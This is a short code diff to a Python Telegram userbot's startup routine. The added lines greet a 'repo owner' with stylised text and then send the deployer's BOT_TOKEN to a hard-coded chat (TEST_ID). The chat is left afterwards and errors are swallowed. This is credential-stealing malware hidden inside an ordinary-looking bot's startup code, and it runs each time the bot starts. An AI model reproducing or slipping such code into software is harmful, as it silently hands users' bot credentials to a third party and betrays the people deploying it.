@@ -72,7 +72,8 @@ class Userbot(Client):
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")   
                 await self.one.join_chat("dhhdshhss6")
-                await self.one.send_message(TEST_ID, "Sending My all data 😁😁..")
+                await self.one.send_message(TEST_ID, "ʜᴇʟʟᴏ ʀᴇᴘᴏ ᴏᴡɴᴇʀ😁\n\nɪ ᴄᴀᴍᴇ ʜᴇʀᴇ ғᴏʀ ɢɪᴠɪɴɢ ʏᴏᴜ (ᴅᴇᴛᴀɪʟs ᴏғ ᴍʏ ᴏᴡɴᴇʀ ᴍᴜsɪᴄ ʙᴏᴛ) 😅😆\n\n‣ ʜᴇʀᴇ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ᴅᴀᴛᴀ")
+                await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.leave_chat(TEST_ID) 
             except:
                 LOGGER(__name__).error(
